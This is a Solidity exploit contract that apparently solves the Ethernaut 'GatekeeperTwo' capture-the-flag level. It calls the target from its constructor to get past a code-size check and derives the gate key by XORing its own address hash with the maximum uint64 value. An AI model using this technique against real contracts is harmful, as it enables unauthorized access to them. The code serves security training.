// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
  function enter(bytes8 _gateKey) public returns (bool) {}
}

contract GateOpenerTwo {

    GatekeeperTwo gatekeeperTwo;

    constructor (address _gatekeeperTwo) public {
      gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);

      bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
      gatekeeperTwo.enter(gateKey);
    }
}